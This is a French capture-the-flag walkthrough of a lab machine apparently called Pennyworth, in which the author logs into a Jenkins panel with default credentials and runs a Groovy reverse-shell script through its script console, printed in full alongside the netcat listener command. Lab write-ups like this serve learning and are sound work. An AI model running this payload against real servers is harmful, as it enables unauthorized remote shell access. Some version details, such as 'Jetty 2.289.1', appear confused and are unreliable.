# PENNYWORTH

## Process

Alors c'est parti aprés un nmap seul un port est ouvert le `8080`!
Je fonce sur le navigateur est tape:`
```bash
{targetIP}:8080
```

Une page avec un login est password s'affiche, connection via user: `root` est password: `password`. <br/>

J'ai noter que le service qui run est `Jetty 9.4.39.v20210325`.<br/>
Voyons ci cela peut m'ettre d'une quelconque utilité.
On note aussi la version une fois sur la target `Jetty 2.289.1`<br/>
Peut étre que cela peut nour servir aussi.<br/>

Je pense avoir trouver une information pertinente qui permet d'obtenir les droit administrateur celle ci est la `CVE-2021-21671` j'espére que c'est la bonne!<br/>

Alors avant toute chose répondons au question qui nous sont donner.

Je comprend alors qu'il vas falloir faire une injection d'un script groovy pour pouvoir obtenir un shell et que pour obtenir les commande il faut que je fasse en sorte que mon script s'execute en demandant l'accés a `cmd` avec `cmd.exe`.

Dans les question il demande aussi quelle est la commande autre que `ip a` pour avoir des information sur l'interface réseaux. Il ce trouve que c'est `ifconfig`. A quoi cela vas me servir je ne sais pas encore mais réfléchissons au probleme! Peut être que les prochaine quesion vont un peu plus m'orienter.

Donc avec les deux dernière on me parle du flag `-u` qui permet de switch le mode de transport via `UDP` avec netcat. Ainsi la dernière question me donne ce que l'on savait déjà ils vas nous falloir faire un reverse shell. C'est parti avec ces information je vais essayer de trouver le moyen de m'introduire sur cette machines. 


Donc en naviguant sur le site sur le quelle on ce trouve dans les parametre de management de kenkins on y trouve un onglet console en y cliquant dessus on tombe donc sur une console! Surement l'endroit on l'on pourras insérer notre script groovy.

Dans le payloads all the thing on regarde si il y a des information sur comment obtenir un reverse shell via un groovy script.
```bash
PayloadsAllTheThings/Methodology\ and\ Resources
```

A l'intérieur on peut:
```bash
cat Reverse\ Shell\ Cheatsheet.md 
```

Ainsi on peut y trouver une section groovy sur le quelle on [clique](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#ognl) ce qui nous enmene sur un lien qui nous explique la marche à suivre pour le script a inserer dans la console.

Une fois le script récuperer et modifier! 

```bash
String host="[notre_ip]";
int port=[port_decoute_sur_notre_machine dans mon cas 443];
String cmd="[commande_que_l'on_veut_executer dans mon cas "/bin/bash"]";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
On met en place un ncat:

```bash
nc -lvnp 443
```
On le lance puis on retourne sur le site pour run le code entrer dans la console.
Un fois run notre ncat nous retourne un shell celui qui nous permet d'obtenir notre petit flag.txt dans le root!